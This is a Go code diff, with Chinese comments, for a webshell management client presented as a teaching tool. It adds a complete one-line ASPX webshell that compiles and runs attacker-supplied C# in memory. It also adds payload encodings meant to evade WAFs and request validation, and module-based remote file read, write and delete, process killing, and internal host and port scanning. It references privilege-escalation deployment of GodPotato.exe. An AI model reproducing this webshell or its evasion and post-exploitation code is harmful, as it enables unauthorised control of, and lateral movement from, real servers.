@@ -14,10 +14,13 @@ import (
 	"context"
 	"crypto/rand"
 	"crypto/tls"
+	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io"
+	"github.com/sirupsen/logrus"
 	mrand "math/rand"
 	"net"
 	"net/http"
@@ -33,6 +36,30 @@ const maxResponseSize = 1 << 20 // 1 MiB
 
 // maxRedirects 限制重定向次数。
 const maxRedirects = 5
+
+// maxDebugPayload 限制 debug 级日志中 payload 的最大打印长度，避免首次下发模块源码或
+// fs.write 的大 base64 把日志刷爆；超出部分截断并标注总长度。
+const maxDebugPayload = 4096
+
+// truncateForLog 把 s 截断到不超过 n 字节；若发生截断，追加总长度说明（供 debug 日志用）。
+func truncateForLog(s string, n int) string {
+	if len(s) <= n {
+		return s
+	}
+	return s[:n] + fmt.Sprintf(" …[truncated, total %d bytes]", len(s))
+}
+
+// Logger 用于打印「发给靶机的请求」日志（与前端交互无关的、真正打到靶机的 HTTP 流量）。
+// 默认使用 logrus 标准 logger；main 启动时会通过 SetLogger 替换为自定义格式（时间戳 + 级别，
+// 无 [weshell] 前缀）的同一 logger，使这类日志与服务自身访问日志统一输出到 stdout。
+var Logger logrus.FieldLogger = logrus.StandardLogger()
+
+// SetLogger 设置包级日志器（传入 nil 视为不修改）。
+func SetLogger(l logrus.FieldLogger) {
+	if l != nil {
+		Logger = l
+	}
+}
 
 // 去 HTML 的工具正则，包级预编译避免重复构造。
 var (
@@ -111,7 +138,27 @@ const (
 	// 经典菜刀一句话多用这种写法（VBScript 引擎）。能力上与 TypeAsp 对齐，
 	// 只是提交给靶机的脚本语言不同：这里全部用 VBScript 拼装，JSON 输出靠内联的 JStr 辅助函数。
 	TypeAspVbs = "asp-vbs"
+	// TypeAspnet 对应靶机侧 shell_aspx_eval.aspx：用 CodeDom 把提交给靶机的 C# 代码片段在运行时
+	// 编译进内存执行（C# 无内建 eval，这是等效写法）。既能跑系统命令，也能做文件/系统/进程/端口
+	// 等结构化采集。仅适用于 IIS + .NET Framework（CodeDom 在 .NET Core 已移除）。
+	TypeAspnet = "aspnet"
 )
+
+// SupportsStructured 判定该连接类型是否支持「结构化能力」（文件管理 / 监控 / 进程 / 端口 / 扫描），
+// 即需要一个能提交代码、并夹随机标记截取回显的通道。php-eval / asp / asp-vbs / aspnet 均支持。
+func SupportsStructured(t string) bool {
+	switch t {
+	case TypeEval, TypeAsp, TypeAspVbs, TypeAspnet:
+		return true
+	}
+	return false
+}
+
+// SupportsLightOS 判定该连接类型是否支持轻量系统探测（/api/sysinfo/{id}/os）。
+// 在 SupportsStructured 基础上，php-cmd 也能跑 uname/ver 判定系统，故一并纳入。
+func SupportsLightOS(t string) bool {
+	return SupportsStructured(t) || t == TypeCmd
+}
 
 // TypeInfo 描述一种连接类型，供前端下拉框与教学说明使用。
 type TypeInfo struct {
@@ -148,13 +195,19 @@ func Types() []TypeInfo {
 			Snippet: `<%execute request("{param}")%>`,
 			Note:    "经典菜刀一句话写法（VBScript 引擎）。提交一段 VBScript 代码，执行系统命令、读写文件、采集系统/进程/端口信息，能力对齐 asp。靶机侧用 <%execute request(\"x\")%> 即可，参数名与这里一致。",
 		},
+		{
+			ID:      TypeAspnet,
+			Label:   "ASP.NET eval 型",
+			Snippet: `<%@ Page Language="C#" ValidateRequest="false" %><%@ Import Namespace="System.CodeDom.Compiler" %><%@ Import Namespace="Microsoft.CSharp" %><% var __raw=Request.Unvalidated["{param}"]; if(!string.IsNullOrEmpty(__raw)){string src=System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(__raw)); var cp=new CompilerParameters();cp.GenerateInMemory=true;cp.ReferencedAssemblies.Add("System.dll");cp.ReferencedAssemblies.Add("System.Web.dll");cp.ReferencedAssemblies.Add("System.Management.dll");cp.ReferencedAssemblies.Add("System.Data.dll");using(var p=new CSharpCodeProvider()){var r=p.CompileAssemblyFromSource(cp,src);if(r.Errors.HasErrors){foreach(CompilerError e in r.Errors)Response.Write("[CompileError] "+e.ToString());}else{r.CompiledAssembly.GetType("WshRunner").GetMethod("Run").Invoke(null,null);}}}%>`,
+			Note:    "经典 ASP.NET（IIS + .NET Framework）。C# 无内建 eval，用 CodeDom 把提交的 C# 代码在运行时编译执行（等效 eval）：可执行命令、读写文件、采集系统/进程/端口信息。靶机侧用 shell_aspx_eval.aspx（参数名 {param}）。仅 .NET Framework 可用，.NET Core 已移除 CodeDom。",
+		},
 	}
 }
 
 // Valid 判断连接类型是否受支持。
 func Valid(t string) bool {
 	switch t {
-	case TypeEval, TypeCmd, TypeAsp, TypeAspVbs:
+	case TypeEval, TypeCmd, TypeAsp, TypeAspVbs, TypeAspnet:
 		return true
 	default:
 		return false
@@ -172,6 +225,56 @@ type ExecOptions struct {
 	SkipVerify bool   // 是否忽略靶机 HTTPS 证书校验
 	Proxy      string // 可选，访问靶机的 HTTP 代理（http/https/socks5），留空则走环境代理
 	UserAgent  string // 可选，自定义 User-Agent；"random" 表示每次随机；留空用默认 UA
+	Encoding   string // 载荷编码方式：空/none(原样)、base64、hex、xor；用于绕过 WAF / ASP.NET 请求验证
+	EncodingKey string // xor 编码密钥（仅 xor 方式需要）
+	Jar        http.CookieJar `json:"-"` // 可选，会话模块机制所需的 cookie 罐（跨请求保持靶机会话），按靶标 ID 隔离
+}
+
+// resolveEncoding 计算实际应用的编码：用户显式指定则用之；未指定时一律原样发送（不编码）。
+// 说明：aspnet 曾默认 base64 以兼容“默认开启请求验证”的 IIS，但本项目自带 aspx 已
+// ValidateRequest=false，且 base64 解码失败会回退用原文；加之每请求下发的 WshRunner 骨架 +
+// 极短 modCall 载荷本身不含 < > & 等会触发请求验证的字符，故 aspnet 不再默认 base64，
+// 直接发明文源码即可。确需绕过 WAF / 请求验证时，仍可在靶机上显式指定 base64 / hex / xor。
+func resolveEncoding(o ExecOptions) string {
+	e := strings.ToLower(strings.TrimSpace(o.Encoding))
+	if e == "none" {
+		return ""
+	}
+	return e
+}
+
+// applyEncoding 按指定方式对明文载荷做传输编码。
+//   - 空/none：原样返回
+//   - base64：标准 base64（不含 < > &，可绕过 ASP.NET 请求验证）
+//   - hex：十六进制（同样不含危险字符）
+//   - xor：与密钥逐字节异或，需 EncodingKey；输出可能含任意字节，由表单层 URL 编码安全传输
+func applyEncoding(raw, enc, key string) (string, error) {
+	switch strings.ToLower(enc) {
+	case "", "none":
+		return raw, nil
+	case "base64":
+		return base64.StdEncoding.EncodeToString([]byte(raw)), nil
+	case "hex":
+		return hex.EncodeToString([]byte(raw)), nil
+	case "xor":
+		if key == "" {
+			return "", errors.New("xor 编码需要密钥(encodingKey)")
+		}
+		return xorEncode(raw, key), nil
+	default:
+		return "", fmt.Errorf("不支持的编码方式: %q", enc)
+	}
+}
+
+// xorEncode 用密钥对明文逐字节异或。
+func xorEncode(s, key string) string {
+	kb := []byte(key)
+	b := []byte(s)
+	out := make([]byte, len(b))
+	for i := range b {
+		out[i] = b[i] ^ kb[i%len(kb)]
+	}
+	return string(out)
 }
 
 // Result 是一次命令执行的完整结果。RequestURL 与 Payload 供教学时观察实际请求形态。
@@ -184,6 +287,10 @@ type Result struct {
 	RequestURL string `json:"requestUrl"`
 	Payload    string `json:"payload"`
 	Truncated  bool   `json:"truncated"`
+	// DeployedPath 是 PrivEsc 自动部署后靶机上的真实落盘路径（文件名取内嵌字节的 MD5，
+	// 形如 C:\Windows\Temp\<md5>.exe）。仅提权流程会填充；普通命令执行恒为空。
+	// 前端用它覆盖「运行结果」里那行客户端预览命令，避免显示成用户填写的 GodPotato.exe。
+	DeployedPath string `json:"deployedPath,omitempty"`
 }
 
 // InspectResult 是一次探测请求的完整报文信息，供教学时观察管理端与靶机之间的真实流量。
@@ -224,17 +331,34 @@ type Shell interface {
 	//   - asp-vbs（VBScript）：`Rem` 注释（实测 `execute "0"` 反而 500）。
 	Probe() string
 
+	// wrap 把一段靶机代码包上引擎相关的标记包裹，返回 (payload, start, end)。
+	// 各引擎只负责"如何夹标记"，helpers 由调用方按需拼进 code（见 Code）。
+	wrap(code string) (string, string, string)
+	// bootstrap 返回会话模块机制的基础代码（store/mod/clear 及共享助手），
+	// 每次请求都随载荷发送（恒定、体积小）；模块源码本身只在首次存入靶机会话。
+	bootstrap() string
+	// modCall 返回调用某模块的短指令（模块源码已缓存在靶机会话中）。
+	// 第二个参数是 encodeArgs 产出的「参数表达式」：php 为 array(...) 字面量；
+	// asp 的 JScript 方言与 asp.net 为 \x1e/\x1f 打包串；asp 的 VBScript 方言为构造
+	// Scripting.Dictionary 的源码（定义页面级变量 wadict，由 wsh_mod 经 Execute 递进模块 Sub 形参）。
+	modCall(name, argexpr string) string
+	// encodeArgs 把参数字典编码成靶机源码里的参数表达式：
+	// php 产出 array('k'=>'v',...)（真字典，无 \x1f 污染）；asp 的 JScript 方言与
+	// asp.net 产出 \x1e/\x1f 打包串；asp 的 VBScript 方言产出构造 Scripting.Dictionary
+	// 的源码（字典对象直递模块 Sub，无打包串、无 Session 参数信箱）。
+	encodeArgs(args map[string]any) string
+	// modStore 返回把模块源码存入靶机会话的指令（src 为原始（未编码）源码；
+	// 编码方式由各靶机类型决定：php/asp 靶机经 base64 注入，asp.net 直接内联 C# 字符串字面量）。
+	modStore(name, src string) string
+	// clearCall 返回清空靶机会话中全部模块缓存的指令。
+	clearCall() string
+	// bootInstall 返回把机件函数（store/mod/clear 等）一次性写入靶机会话的指令，
+	// 供首次接触或会话失效后自愈；无需每次随载荷发送（已由极短的重水合前缀取代）。
+	bootInstall() string
+
 	// 结构化能力：返回靶机代码与可能的错误；不支持时返回错误。
 	// 这些方法的职责只是"产出要提交的代码字符串"（已转义、已替换占位符），
 	// 实际的 HTTP 传输由 Run / Code 负责。
-	FsList(dir string) (string, error)
-	FsRead(path string) (string, error)
-	FsWrite(path, b64 string) (string, error)
-	FsDelete(path string) (string, error)
-	Monitor() (string, error)
-	ProcList() (string, error)
-	ProcKill(pid string, sig int) (string, error)
-	PortsList() (string, error)
 	// PortScan 对目标主机做 TCP 端口扫描，返回扫描用代码与可能的错误；不支持时返回错误。
 	// host 为目标地址，ports 为已展开的逗号分隔端口列表（由 ExpandPorts 预先处理）。
 	PortScan(host string, ports string) (string, error)
@@ -242,8 +366,6 @@ type Shell interface {
 	// hosts 为竖线分隔、已展开的主机列表；ports 为已展开的逗号分隔端口列表；
 	// probe 为逗号分隔的存活探测端口（由调用方提供，见 ScanProbePorts）。
 	HostScan(hosts string, ports string, probe string) (string, error)
-	PhpInfo() (string, error)
-	AspEnv() (string, error)
 }
 
 // ForType 按连接类型返回对应的 Shell 实现。无效类型由调用方先用 Valid 校验，
@@ -258,6 +380,8 @@ func ForType(t string) Shell {
 		return newAspJS()
 	case TypeAspVbs:
 		return newAspVBS()
+	case TypeAspnet:
+		return newAspnet()
 	default:
 		return phpShell{eval: true}
 	}
@@ -294,8 +418,8 @@ func ExecuteASP(ctx context.Context, o ExecOptions, aspCode string) Result {
 	if err := o.validate(); err != nil {
 		return Result{Error: err.Error()}
 	}
-	if o.Type != TypeAsp && o.Type != TypeAspVbs {
-		return Result{Error: "该操作仅支持 asp / asp-vbs 类型靶机"}
+	if o.Type != TypeAsp && o.Type != TypeAspVbs && o.Type != TypeAspnet {
+		return Result{Error: "该操作仅支持 asp / asp-vbs / aspnet 类型靶机"}
 	}
 	return ForType(o.Type).Code(ctx, o, aspCode)
 }
@@ -308,10 +432,24 @@ func send(ctx context.Context, o ExecOptions, payload, start, end string) Result
 		return Result{Error: fmt.Sprintf("URL 解析失败: %v", err)}
 	}
 	form := url.Values{}
-	form.Set(o.Param, payload)
+	enc := resolveEncoding(o)
+	val, err := applyEncoding(payload, enc, o.EncodingKey)
+	if err != nil {
+		return Result{Error: err.Error(), Payload: payload, RequestURL: o.TargetURL}
+	}
+	form.Set(o.Param, val)
+	// 仅当用户显式指定编码时才附带 enc/key 提示，靶机据此解码；
+	// aspnet 的 base64 兜底不发送 enc，依赖靶机默认按 base64 解码。
+	if o.Encoding != "" {
+		form.Set("enc", strings.ToLower(o.Encoding))
+		if strings.EqualFold(o.Encoding, "xor") && o.EncodingKey != "" {
+			form.Set("key", o.EncodingKey)
+		}
+	}
 
 	var body io.Reader
 	displayURL := o.TargetURL
+	var reqBytes int
 	switch method {
 	case http.MethodGet:
 		// 保留靶标 URL 上原有的查询串，再追加我们的参数。
@@ -321,8 +459,10 @@ func send(ctx context.Context, o ExecOptions, payload, start, end string) Result
 		}
 		u.RawQuery = q.Encode()
 		displayURL = u.String()
+		reqBytes = len(u.RawQuery)
 	default:
 		body = strings.NewReader(form.Encode())
+		reqBytes = len(form.Encode())
 	}
 
 	if o.Timeout > 0 {
@@ -351,8 +491,16 @@ func send(ctx context.Context, o ExecOptions, payload, start, end string) Result
 		}
 	}
 
+	encName := enc
+	if encName == "" {
+		encName = "none"
+	}
+	Logger.Debugf("webshell payload target=%s param=%s enc=%s bytes=%d:\n%s",
+		displayURL, o.Param, encName, len(payload), truncateForLog(payload, maxDebugPayload))
+
 	resp, err := client.Do(req)
 	if err != nil {
+		Logger.Infof("request failed %s %s param=%d err=%v", method, displayURL, reqBytes, err)
 		return Result{
 			Error:      fmt.Sprintf("请求失败: %v", err),
 			LatencyMS:  time.Since(begin).Milliseconds(),
@@ -364,6 +512,18 @@ func send(ctx context.Context, o ExecOptions, payload, start, end string) Result
 
 	raw, err := io.ReadAll(io.LimitReader(resp.Body, maxResponseSize))
 	latency := time.Since(begin).Milliseconds()
+	if err != nil {
+		Logger.Infof("request read failed %s %s param=%d err=%v", method, displayURL, reqBytes, err)
+		return Result{
+			Error:      fmt.Sprintf("读取响应失败: %v", err),
+			Status:     resp.StatusCode,
+			LatencyMS:  latency,
+			RequestURL: displayURL,
+			Payload:    payload,
+		}
+	}
+	Logger.Infof("%s %s param=%d resp=%d %d %dms",
+		method, displayURL, reqBytes, len(raw), resp.StatusCode, latency)
 	if err != nil {
 		return Result{
 			Error:      fmt.Sprintf("读取响应失败: %v", err),
@@ -395,7 +555,10 @@ func send(ctx context.Context, o ExecOptions, payload, start, end string) Result
 		res.OK = false
 		body := strings.TrimSpace(out)
 		if body == "" {
-			res.Error = fmt.Sprintf("靶机返回 HTTP %d（响应体为空）", resp.StatusCode)
+			// 响应体为空通常是靶机 display_errors=Off，把真实致命错误吞掉了。
+			// weshell 看不到原因，只能提示用户去靶机侧开 display_errors 或查错误日志。
+			res.Error = fmt.Sprintf("靶机返回 HTTP %d（响应体为空，未透出错误；"+
+				"请到靶机侧开启 display_errors 或查看 PHP 错误日志定位致命错误）", resp.StatusCode)
 		} else {
 			// 靶机报错时响应通常是一整页 HTML 错误页，剥离标签后塞进 error，
 			// 让前端能力页 / 命令执行能直接展示靶机的真实报错原因。
@@ -425,7 +588,18 @@ func Inspect(ctx context.Context, o ExecOptions) InspectResult {
 		return InspectResult{Error: fmt.Sprintf("URL 解析失败: %v", err)}
 	}
 	form := url.Values{}
-	form.Set(o.Param, ForType(o.Type).Probe())
+	p := ForType(o.Type).Probe()
+	encP, err := applyEncoding(p, resolveEncoding(o), o.EncodingKey)
+	if err != nil {
+		return InspectResult{Error: err.Error(), RequestURL: o.TargetURL}
+	}
+	form.Set(o.Param, encP)
+	if o.Encoding != "" {
+		form.Set("enc", strings.ToLower(o.Encoding))
+		if strings.EqualFold(o.Encoding, "xor") && o.EncodingKey != "" {
+			form.Set("key", o.EncodingKey)
+		}
+	}
 
 	var body io.Reader
 	displayURL := o.TargetURL
@@ -475,7 +649,7 @@ func Inspect(ctx context.Context, o ExecOptions) InspectResult {
 			Error:          fmt.Sprintf("请求失败: %v", err),
 			LatencyMS:      latency,
 			RequestURL:     displayURL,
-			Payload:        form.Get(o.Param),
+			Payload:        p,
 			RequestHeaders: req.Header,
 		}
 	}
@@ -488,7 +662,7 @@ func Inspect(ctx context.Context, o ExecOptions) InspectResult {
 		Status:          resp.StatusCode,
 		LatencyMS:       latency,
 		RequestURL:      displayURL,
-		Payload:         form.Get(o.Param),
+		Payload:         p,
 		RequestHeaders:  req.Header,
 		ResponseHeaders: resp.Header,
 	}
@@ -575,6 +749,7 @@ func (o ExecOptions) httpClient() (*http.Client, error) {
 	return &http.Client{
 		Transport: transport,
 		Timeout:   o.Timeout,
+		Jar:       o.Jar,
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
 			if len(via) >= maxRedirects {
 				return fmt.Errorf("重定向次数超过 %d 次，已中止", maxRedirects)
@@ -654,6 +829,12 @@ func vbsStr(s string) string {
 // 统一了原 fsExec / fsExecASP 的解析逻辑（需含 ok 字段，false 时取 error）。
 func execJSON(ctx context.Context, o ExecOptions, s Shell, code string) (map[string]any, error) {
 	res := s.Code(ctx, o, code)
+	return parseJSONResult(res)
+}
+
+// parseJSONResult 把一次靶机回显（Result）解析为 map；要求含 ok 字段，
+// ok=false 时取 error。供 execJSON 与会话模块机制共用。
+func parseJSONResult(res Result) (map[string]any, error) {
 	if !res.OK {
 		if res.Error != "" {
 			return nil, fmt.Errorf("%s", res.Error)
@@ -702,11 +883,7 @@ type FsFile struct {
 // FsList 列出目录内容。
 func FsList(ctx context.Context, o ExecOptions, dir string) (entries []FSListEntry, resolved string, err error) {
 	s := ForType(o.Type)
-	code, err := s.FsList(dir)
-	if err != nil {
-		return nil, "", err
-	}
-	m, err := execJSON(ctx, o, s, code)
+	m, err := CallModule(ctx, o, s, "fs.list", map[string]any{"dir": dir})
 	if err != nil {
 		return nil, "", err
 	}
@@ -729,11 +906,7 @@ func FsList(ctx context.Context, o ExecOptions, dir string) (entries []FSListEnt
 // FsRead 读取文件内容，以 base64 返回。
 func FsRead(ctx context.Context, o ExecOptions, path string) (FsFile, error) {
 	s := ForType(o.Type)
-	code, err := s.FsRead(path)
-	if err != nil {
-		return FsFile{}, err
-	}
-	m, err := execJSON(ctx, o, s, code)
+	m, err := CallModule(ctx, o, s, "fs.read", map[string]any{"path": path})
 	if err != nil {
 		return FsFile{}, err
 	}
@@ -741,24 +914,17 @@ func FsRead(ctx context.Context, o ExecOptions, path string) (FsFile, error) {
 }
 
 // FsWrite 写入文件内容（b64 为 base64 编码后的数据）。
+// 路径在进入靶机载荷前统一归一化分隔符（见 normalizeWinPath）。
 func FsWrite(ctx context.Context, o ExecOptions, path, b64 string) error {
 	s := ForType(o.Type)
-	code, err := s.FsWrite(path, b64)
-	if err != nil {
-		return err
-	}
-	_, err = execJSON(ctx, o, s, code)
+	_, err := CallModule(ctx, o, s, "fs.write", map[string]any{"path": normalizeFsWritePath(path), "b64": b64})
 	return err
 }
 
 // FsDelete 删除文件或（空）目录。
 func FsDelete(ctx context.Context, o ExecOptions, path string) error {
 	s := ForType(o.Type)
-	code, err := s.FsDelete(path)
-	if err != nil {
-		return err
-	}
-	_, err = execJSON(ctx, o, s, code)
+	_, err := CallModule(ctx, o, s, "fs.delete", map[string]any{"path": path})
 	return err
 }
 
@@ -767,62 +933,128 @@ func FsDelete(ctx context.Context, o ExecOptions, path string) error {
 // Monitor 读取靶机的 CPU / 内存 / 负载 / 进程等资源概览（php-eval / asp 类型）。
 func Monitor(ctx context.Context, o ExecOptions) (map[string]any, error) {
 	s := ForType(o.Type)
-	code, err := s.Monitor()
-	if err != nil {
-		return nil, err
+	return CallModule(ctx, o, s, "sys.monitor", map[string]any{})
+}
+
+// OSInfo 轻量探测靶机操作系统，用于选中靶标时快速判定系统类型，
+// 统一返回归一化后的 os 标识（'windows'/'linux'/'mac'）。
+//   - php-eval：直接 eval 一段自包含 PHP（php_uname('s')），不依赖靶机会话与 _hlp 缓存，
+//     避免会话不可写 / 助手缓存陈旧导致模块式探测失败；失败再退回命令通道。
+//   - php-cmd ：无 eval 通道，用命令通道（uname / ver）判定。
+//   - asp 等 ：走会话模块（sys.info）；asp 通常由调用方直接判定为 Windows，不会走到这里。
+func OSInfo(ctx context.Context, o ExecOptions) (map[string]any, error) {
+	switch o.Type {
+	case TypeCmd:
+		return osInfoByCommand(ctx, o)
+	case TypeEval:
+		if m, err := osInfoByDirectPHP(ctx, o); err == nil {
+			if os, _ := m["os"].(string); os != "" {
+				return m, nil
+			}
+		}
+		return osInfoByCommand(ctx, o)
+	case TypeAsp, TypeAspVbs, TypeAspnet:
+		// ASP / ASP.NET 靶机必为 Windows（IIS），无需经模块探测；直接归一化返回。
+		return map[string]any{"ok": true, "os": "windows", "hostname": ""}, nil
+	default:
+		s := ForType(o.Type)
+		m, err := CallModule(ctx, o, s, "sys.info", map[string]any{})
+		if err != nil {
+			return nil, err
+		}
+		// 把 php_uname() / WMI Caption 这类原始串归一到内部标识，避免前端再解析。
+		if raw, ok := m["os"].(string); ok {
+			m["os"] = normalizeOS(raw)
+		}
+		return m, nil
 	}
-	return execJSON(ctx, o, s, code)
+}
+
+// osInfoByDirectPHP 直接向 php-eval 靶机提交一段自包含 PHP（不依赖会话/助手）：
+// php_uname('s') 给出系统名（Windows NT / Linux / Darwin），gethostname() 给出主机名，
+// 以 0x1F 分隔后由标记包裹回显。若 php_uname 被 disable_functions 禁用而拿不到系统名，
+// 返回的 os 为空串，由调用方退回命令通道。
+func osInfoByDirectPHP(ctx context.Context, o ExecOptions) (map[string]any, error) {
+	s := ForType(o.Type)
+	res := s.Code(ctx, o, `echo @php_uname('s')."\x1f".@gethostname();`)
+	if !res.OK {
+		return nil, fmt.Errorf("直接 OS 探测失败: %s", res.Error)
+	}
+	osName, host := res.Output, ""
+	if i := strings.IndexByte(res.Output, 0x1f); i >= 0 {
+		osName, host = res.Output[:i], res.Output[i+1:]
+	}
+	return map[string]any{"ok": true, "os": normalizeOS(osName), "hostname": strings.TrimSpace(host)}, nil
+}
+
+// osInfoByCommand 针对 php-cmd（无 eval 通道）靶机：直接跑系统命令判定操作系统。
+// 先试 uname（Linux/macOS 必有），再试 ver（Windows cmd 必有）——避免 `;`/`&`
+// 在 cmd 与 sh 下语义不一致（cmd 不认 `;`，sh 的 `&` 会后台化）。返回归一化 os 标识。
+func osInfoByCommand(ctx context.Context, o ExecOptions) (map[string]any, error) {
+	// Linux / macOS：uname -s 输出 Linux / Darwin。
+	if os := normalizeOS(Execute(ctx, o.WithCommand("uname -s")).Output); os != "" {
+		return map[string]any{"ok": true, "os": os}, nil
+	}
+	// Windows：ver 输出 "Microsoft Windows [Version ...]"。
+	if os := normalizeOS(Execute(ctx, o.WithCommand("ver")).Output); os != "" {
+		return map[string]any{"ok": true, "os": os}, nil
+	}
+	return map[string]any{"ok": true, "os": ""}, nil
+}
+
+// normalizeOS 把 php_uname() / WMI Caption / uname / ver 返回的系统串归一到内部标识。
+func normalizeOS(s string) string {
+	l := strings.ToLower(s)
+	switch {
+	case strings.Contains(l, "windows"), strings.Contains(l, "winnt"):
+		return "windows"
+	case strings.Contains(l, "darwin"):
+		return "mac"
+	case strings.Contains(l, "linux"):
+		return "linux"
+	}
+	return ""
 }
 
 // ProcList 读取靶机进程列表（含 PPID），php-eval / asp 类型靶机支持。
 func ProcList(ctx context.Context, o ExecOptions) (map[string]any, error) {
 	s := ForType(o.Type)
-	code, err := s.ProcList()
-	if err != nil {
-		return nil, err
-	}
-	return execJSON(ctx, o, s, code)
+	return CallModule(ctx, o, s, "proc.list", map[string]any{})
 }
 
 // ProcKill 结束靶机进程（pid 为进程号，sig 为信号，默认 15/SIGTERM，9 为 SIGKILL）。
 // php-eval 走 posix_kill / kill；asp 走 taskkill（sig=9 加 /F 强杀）。
 func ProcKill(ctx context.Context, o ExecOptions, pid string, sig int) (map[string]any, error) {
 	s := ForType(o.Type)
-	code, err := s.ProcKill(pid, sig)
-	if err != nil {
-		return nil, err
-	}
-	return execJSON(ctx, o, s, code)
+	return CallModule(ctx, o, s, "proc.kill", map[string]any{"pid": pid, "sig": sig})
 }
 
 // PortsList 读取靶机监听端口列表（含对应 PID / 进程名），php-eval / asp 类型靶机支持。
 func PortsList(ctx context.Context, o ExecOptions) (map[string]any, error) {
 	s := ForType(o.Type)
-	code, err := s.PortsList()
-	if err != nil {
-		return nil, err
-	}
-	return execJSON(ctx, o, s, code)
+	return CallModule(ctx, o, s, "net.ports", map[string]any{})
 }
 
 // PhpInfo 读取靶机 PHP 环境能力研判（含禁用函数、受限配置），仅 php-eval 类型靶机支持。
 func PhpInfo(ctx context.Context, o ExecOptions) (map[string]any, error) {
-	s := ForType(o.Type)
-	code, err := s.PhpInfo()
-	if err != nil {
-		return nil, err
+	if o.Type == TypeAsp || o.Type == TypeAspVbs {
+		return nil, fmt.Errorf("ASP 靶机非 PHP 环境，不支持 phpinfo")
 	}
-	return execJSON(ctx, o, s, code)
+	s := ForType(o.Type)
+	return CallModule(ctx, o, s, "sys.phpinfo", map[string]any{})
 }
 
 // AspEnv 读取 ASP 靶机环境能力研判（COM 组件可用性等），asp / asp-vbs 类型靶机支持。
 func AspEnv(ctx context.Context, o ExecOptions) (map[string]any, error) {
 	s := ForType(o.Type)
-	code, err := s.AspEnv()
-	if err != nil {
-		return nil, err
-	}
-	return execJSON(ctx, o, s, code)
+	return CallModule(ctx, o, s, "sys.env", map[string]any{})
+}
+
+// AspNetEnv 读取 ASP.NET 靶机环境能力研判（.NET 版本 / 当前用户 / Web 服务 / 物理路径等），
+// aspnet 类型靶机支持。复用会话模块机制（sys.env 模块）。
+func AspNetEnv(ctx context.Context, o ExecOptions) (map[string]any, error) {
+	s := ForType(o.Type)
+	return CallModule(ctx, o, s, "sys.env", map[string]any{})
 }
 
 // ExpandPorts 把端口规格展开为逗号分隔的整数字符串。支持单端口 "80"、范围 "1-1000"、
@@ -1026,7 +1258,8 @@ func incIP(ip net.IP) {
 }
 
 // HostScan 对内网多台目标主机做 TCP 端口扫描，返回每台主机的存活与开放端口。
-// php-eval / asp 类型靶机支持；靶机侧一次性完成存活探测与端口扫描并聚合返回。
+// aspnet 走服务端缓存模块（net.hostscan，WshOpen 随 WshMod_net 编译缓存，逐主机只 Invoke）；
+// php-eval / asp 类型靶机走各自内联模板（靶机侧一次性完成存活探测与端口扫描并聚合返回）。
 func HostScan(ctx context.Context, o ExecOptions, hosts []string, ports string, probe string) (map[string]any, error) {
 	if len(hosts) == 0 {
 		return nil, fmt.Errorf("目标主机列表为空")
@@ -1036,6 +1269,13 @@ func HostScan(ctx context.Context, o ExecOptions, hosts []string, ports string, 
 		return nil, err
 	}
 	s := ForType(o.Type)
+	if s.Type() == TypeAspnet {
+		return CallModule(ctx, o, s, "net.hostscan", map[string]any{
+			"hosts": strings.Join(hosts, "|"),
+			"ports": expanded,
+			"probe": probe,
+		})
+	}
 	code, err := s.HostScan(strings.Join(hosts, "|"), expanded, probe)
 	if err != nil {
 		return nil, err
@@ -1043,7 +1283,9 @@ func HostScan(ctx context.Context, o ExecOptions, hosts []string, ports string, 
 	return execJSON(ctx, o, s, code)
 }
 
-// PortScan 对目标主机做 TCP 端口扫描，返回开放端口列表。php-eval / asp 类型靶机支持。
+// PortScan 对目标主机做 TCP 端口扫描，返回开放端口列表。aspnet 走服务端缓存模块
+// （net.scan，WshOpen 随 WshMod_net 编译一次后缓存，逐端口请求只 Invoke 缓存 Type，
+// 不再每次重编 WshRunner 骨架）；php-eval / asp 类型靶机走各自内联模板。
 // host 为目标地址（IP 或域名），ports 为端口规格（如 "80"、"1-1000"、"21,22,80,443"）。
 func PortScan(ctx context.Context, o ExecOptions, host, ports string) (map[string]any, error) {
 	host = strings.TrimSpace(host)
@@ -1055,6 +1297,9 @@ func PortScan(ctx context.Context, o ExecOptions, host, ports string) (map[strin
 		return nil, err
 	}
 	s := ForType(o.Type)
+	if s.Type() == TypeAspnet {
+		return CallModule(ctx, o, s, "net.scan", map[string]any{"host": host, "ports": expanded})
+	}
 	code, err := s.PortScan(host, expanded)
 	if err != nil {
 		return nil, err
